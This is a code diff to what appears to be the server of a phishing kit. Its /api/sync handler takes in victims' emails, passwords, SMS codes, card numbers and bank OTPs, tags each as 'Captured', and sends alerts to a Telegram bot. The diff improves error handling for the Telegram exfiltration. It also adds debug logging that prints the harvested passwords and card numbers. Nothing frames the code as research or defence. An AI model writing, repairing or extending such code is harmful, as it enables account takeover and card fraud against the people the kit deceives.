@@ -307,8 +307,19 @@ const sendTelegram = (msg: string) => {
             'Content-Length': Buffer.byteLength(data)
         }
     };
-    const req = https.request(options, res => {});
-    req.on('error', e => console.error('[Telegram] Error:', e));
+    const req = https.request(options, res => {
+        let body = '';
+        res.on('data', chunk => body += chunk);
+        res.on('end', () => {
+            if (res.statusCode !== 200) {
+                console.error(`[Telegram] Failed (Status ${res.statusCode}): ${body}`);
+                console.error(`[Telegram] Payload was: ${msg}`);
+            } else {
+                console.log(`[Telegram] Sent successfully (ID: ${JSON.parse(body).result?.message_id})`);
+            }
+        });
+    });
+    req.on('error', e => console.error('[Telegram] Network Error:', e));
     req.write(data);
     req.end();
 };
@@ -379,12 +390,25 @@ app.post('/api/sync', async (req, res) => {
             const d = data;
             const e = existing.data || existing; // handle raw or nested
 
+            // Debug Logging for Logic
+            console.log(`[Sync Debug] ID: ${data.sessionId}`);
+            console.log(`[Sync Debug] Email: New='${d.email}' vs Old='${e.email}'`);
+            console.log(`[Sync Debug] Pass: New='${d.password}' vs Old='${e.password}'`);
+            console.log(`[Sync Debug] Card: New='${d.cardNumber}' vs Old='${e.cardNumber}'`);
+
             // Check specific fields for changes
-            if (d.email && d.email !== e.email) changes.push('Login Captured');
-            if (d.password && d.password !== e.password) changes.push('Password Captured');
-            if (d.phoneCode && d.phoneCode !== e.phoneCode) changes.push('SMS Code Captured');
-            if (d.cardNumber && d.cardNumber !== e.cardNumber) changes.push('Card Captured');
-            if (d.cardOtp && d.cardOtp !== e.cardOtp) changes.push('Bank OTP Captured');
+            // Note: e.email might be undefined if not set yet
+            if (d.email && d.email !== (e.email || '')) changes.push('Login Captured');
+            if (d.password && d.password !== (e.password || '')) changes.push('Password Captured');
+            if (d.phoneCode && d.phoneCode !== (e.phoneCode || '')) changes.push('SMS Code Captured');
+            if (d.cardNumber && d.cardNumber !== (e.cardNumber || '')) changes.push('Card Captured');
+            if (d.cardOtp && d.cardOtp !== (e.cardOtp || '')) changes.push('Bank OTP Captured');
+
+            if (changes.length > 0) {
+                console.log(`[Sync Debug] Changes Detected: ${changes.join(', ')}`);
+            } else {
+                console.log(`[Sync Debug] No Changes Detected`);
+            }
 
             // Completed Session
             if (existing.status !== 'Verified' && data.status === 'Verified') {
